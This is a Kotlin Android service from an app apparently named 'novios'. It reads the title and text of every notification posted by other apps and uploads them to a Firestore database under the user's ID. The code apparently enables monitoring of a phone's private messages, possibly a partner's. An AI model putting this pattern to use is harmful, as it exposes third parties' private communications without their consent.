package com.novios

import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import org.json.JSONObject

class NotificationListener : NotificationListenerService() {
    private var firestore: FirebaseFirestore? = null
    private var uid: String? = null

    override fun onCreate() {
        super.onCreate()
        Log.d("NotifListener", "NotificationListener service created")

        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        uid = prefs.getString("flutter.user_uid", null)

        try {
            firestore = FirebaseFirestore.getInstance()
        } catch (e: Exception) {
            Log.e("NotifListener", "Firestore init failed: ${e.message}")
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return
        sendNotificationToFlutter(sbn)
        writeNotificationToFirestore(sbn)
    }

    private fun sendNotificationToFlutter(sbn: StatusBarNotification) {
        try {
            val packageName = sbn.packageName ?: return
            val notification = sbn.notification ?: return
            val extras = notification.extras ?: return

            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString()
                ?: extras.getCharSequence("android.bigText")?.toString()
                ?: ""

            if (title.isEmpty() && text.isEmpty()) return

            val json = JSONObject().apply {
                put("app", packageName)
                put("title", title)
                put("text", text)
                put("packageName", packageName)
            }

            val channel = MainActivity.notificationChannel
            if (channel != null) {
                channel.invokeMethod("onNotification", json.toString())
                Log.d("NotifListener", "Sent: $packageName - $title")
            } else {
                Log.w("NotifListener", "Flutter channel not available yet")
            }
        } catch (e: Exception) {
            Log.e("NotifListener", "Error processing notification: ${e.message}")
        }
    }

    private fun writeNotificationToFirestore(sbn: StatusBarNotification) {
        try {
            // Releer uid cada vez porque el servicio puede iniciar antes que Flutter
            if (uid.isNullOrEmpty()) {
                val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
                uid = prefs.getString("flutter.user_uid", null)
            }
            val currentUid = uid
            if (currentUid.isNullOrEmpty()) {
                Log.w("NotifListener", "No UID, skipping Firestore write")
                return
            }
            val db = firestore
            if (db == null) {
                try {
                    firestore = FirebaseFirestore.getInstance()
                } catch (e: Exception) {
                    Log.e("NotifListener", "Firestore init failed: ${e.message}")
                }
                return
            }

            val packageName = sbn.packageName ?: return
            if (packageName.contains("novios") || packageName.contains("everus") || packageName.contains("ever")) return

            val notification = sbn.notification ?: return
            val extras = notification.extras ?: return

            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString()
                ?: extras.getCharSequence("android.bigText")?.toString()
                ?: ""

            if (title.isEmpty() && text.isEmpty()) return

            val now = System.currentTimeMillis()
            val safeApp = packageName.replace(Regex("[^a-zA-Z0-9]"), "")
            val docId = "${now}_$safeApp"

            val notifData = hashMapOf<String, Any>(
                "app" to packageName,
                "title" to title,
                "text" to text,
                "packageName" to packageName,
                "timestamp" to FieldValue.serverTimestamp(),
                "createdAt" to now.toString()
            )

            db.collection("users").document(currentUid)
                .collection("notification_logs").document(docId)
                .set(notifData)

            val lastNotif = hashMapOf<String, Any>(
                "app" to packageName,
                "title" to title,
                "text" to text,
                "packageName" to packageName,
                "time" to now
            )

            db.collection("users").document(currentUid)
                .set(
                    hashMapOf<String, Any>(
                        "lastNotification" to lastNotif,
                        "lastNotificationTime" to FieldValue.serverTimestamp()
                    ),
                    com.google.firebase.firestore.SetOptions.merge()
                )

            Log.d("NotifListener", "Firestore: $packageName - $title")
        } catch (e: Exception) {
            Log.e("NotifListener", "Firestore write failed: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Not needed
    }
}

